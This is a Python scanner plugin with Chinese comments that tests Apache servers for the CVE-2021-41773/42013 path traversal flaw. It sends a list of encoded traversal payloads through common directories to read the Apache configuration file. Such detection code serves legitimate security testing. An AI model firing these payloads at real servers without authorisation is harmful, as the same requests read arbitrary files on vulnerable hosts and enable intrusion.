import requests
from urllib.parse import urljoin
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

class ApacheServerVuln:
    name = "Apache路径穿越漏洞检测"
    description = "检测Apache服务器路径穿越漏洞(CVE-2021-41773/CVE-2021-42013等)"
    author = "Security Researcher"
    group = "Web Servers"
    
    def check(self, target):
        """
        检测Apache服务器是否存在路径穿越漏洞
        :param target: 目标URL (如 http://example.com)
        :return: 检测结果字符串
        """
        if not target.startswith(("http://", "https://")):
            target = "http://" + target
            
        result = ""
        
        # 使用无害的测试文件（避免读取/etc/passwd）
        test_file = "/etc/apache2/apache2.conf"  # Apache配置文件通常可读且无害
        test_string = "ServerRoot"  # 配置文件常见字符串
        
        # 路径穿越测试向量
        traversal_vectors = [
            "/.%2e/%2e%2e/%2e%2e",
            "/.%2e/.%2e/.%2e/.%2e",
            "/%%32%65%%32%65/%%32%65%%32%65",
            "/.%%32%65/.%%32%65/.%%32%65",
            "/.%%32e/.%%32e/.%%32e",
            "/.%2%65/.%2%65/.%2%65"
        ]
        
        # 常见可能允许穿越的目录
        test_dirs = [
            '/icons/',
            '/cgi-bin/',
            '/assets/',
            '/static/'
        ]
        
        headers = {
            'User-Agent': 'Mozilla/5.0'
        }
        
        vulnerable = False
        details = []
        
        for vector in traversal_vectors:
            for directory in test_dirs:
                test_url = urljoin(target, directory + vector + test_file)
                try:
                    response = requests.get(
                        test_url,
                        headers=headers,
                        verify=False,
                        timeout=10
                    )
                    
                    if response.status_code == 200 and test_string in response.text:
                        details.append(f"通过 {vector} 成功访问到 {test_file}")
                        vulnerable = True
                    
                except requests.exceptions.RequestException:
                    continue
        
        if vulnerable:
            result = f"[{self.name}] 目标 {target}：存在路径穿越漏洞\n" + "\n".join(details)
        else:
            result = f"[{self.name}] 目标 {target}：未发现路径穿越漏洞"
            
        return result